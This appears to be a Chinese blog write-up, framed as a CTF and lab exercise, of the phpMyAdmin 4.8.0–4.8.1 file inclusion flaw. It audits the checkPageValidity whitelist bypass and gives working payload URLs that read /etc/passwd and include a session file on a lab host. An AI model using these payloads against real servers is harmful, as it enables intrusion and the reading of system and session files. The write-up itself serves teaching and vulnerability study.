\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/xhds/archive/2004/01/13/12579041.html)

**目录**

*   [简介](#_label0)
*   [受影响版本](#_label1)
*   [代码审计](#_label2)
*   [漏洞利用方法](#_label3)

[回到顶部](#_labelTop)

简介
--

**环境复现：**https://gitee.com/xiaohua1998/hctf\_2018\_warmup

**考察知识点:** 文件包含漏洞 (phpmyadmin 4.8.1 任意文件包含)

**线上平台:** 榆林学院内可使用协会内部的网络安全实验平台

phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具。其 index.php 中存在一处文件包含逻辑，

通过二次编码即可绕过检查，造成远程文件包含漏洞。

[回到顶部](#_labelTop)

受影响版本
-----

phpMyAdmin 4.8.0 和 4.8.1 受到影响。

[回到顶部](#_labelTop)

代码审计
----

通过审计 index.php 发现了文件包含 只要达到 if 里面的条件即可执行文件包含。

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327062300737-1950736828.png)

! empty($\_REQUEST\['target'\])  //request 接受的 target 不能为空  
&& is\_string($\_REQUEST\['target'\]) //target 里面的值必须是字符串  
&& ! preg\_match('/^index/', $\_REQUEST\['target'\]) //target 里面的值不能以 index 为头  
&& ! in\_array($\_REQUEST\['target'\], $target\_blacklist)  //target 传进来的值不能是 $target\_backlist 里面的值 如 "import.php" 和 "export.php"  
&& Core::checkPageValidity($\_REQUEST\['target'\])  // 将值给 checkPageValidity() 函数 要返回 true 才能全整体为真

接下来继续追溯 checkPageValidity 函数 

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
public static function checkPageValidity(&$page, array $whitelist = \[\]) {
　　　　//首先判断$whitelist不为空 则将$goto\_whitelist值赋值给$whitelist
        if (empty($whitelist)) {
            $whitelist = self::$goto\_whitelist;  //这里得追溯下 看看$got\_whitelist
        }
　　　　//判断传进来的值 要存在而且
        if (! isset($page) || !is\_string($page)) {
            return false;
        }
　　　　　//判断传进来的值是否在白名单内
        if (in\_array($page, $whitelist)) {
            return true;
        }

　　　　//截取传进来的？号
        $\_page = mb\_substr(
            $page,
            0,
            mb\_strpos($page . '?', '?')
        );
　　　　　　//判断$\_page是否输入$page
        if (in\_array($\_page, $whitelist)) {
            return true;
        }
　　　　　　
　　　　　　//给page解码
        $\_page = urldecode($page);
　　　　//截取？号部分
        $\_page = mb\_substr(
            $\_page,
            0,
            mb\_strpos($\_page . '?', '?')
        );
        if (in\_array($\_page, $whitelist)) {
            return true;
        }

        return false;
    }

```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327064912161-536808034.png)

 得到上面的情况我们可以构造 payload:

```
http://192.168.52.129:8080/?target=tbl\_zoom\_select.php?/../../../../../../etc/passwd

```

[回到顶部](#_labelTop)

漏洞利用方法
------

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327074909744-863905312.png)

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327075028889-516364469.png)

包含 session 文件 payload

```
http://192.168.52.129:8080/?target=tbl\_zoom\_select.php?/../../../../../../tmp/sess\_1d4171b498cba40de617fbea8902d5f0

```

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327075532358-1934078563.png)